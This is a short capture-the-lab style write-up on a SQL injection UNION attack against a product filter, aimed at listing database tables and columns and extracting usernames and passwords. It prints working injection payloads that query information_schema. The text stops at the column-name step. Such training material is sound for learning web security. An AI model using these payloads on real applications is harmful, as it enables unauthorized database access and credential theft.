# Lab: SQL Injection Attack â€” Listing Database Contents on Non-Oracle Databases

This lab contains a **SQL Injection** vulnerability in the product category filter.  
The results from the query are returned in the application's response, so a **UNION attack** can be used to retrieve data from other tables.

The application has a login function, and the database contains a table holding usernames and passwords.  
The goal is to determine the table name and column names, then retrieve all usernames and passwords.

To solve the lab, log in as the `administrator` user.

```bash
'+UNION+SELECT+'a','b'--
```

### 3. Find Table Name

Table name found:
**`users_pnjafw`**

```bash
'+UNION+SELECT+NULL,NULL+FROM+information_schema.tables--
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

### 4. Find Column Names

Column names found:
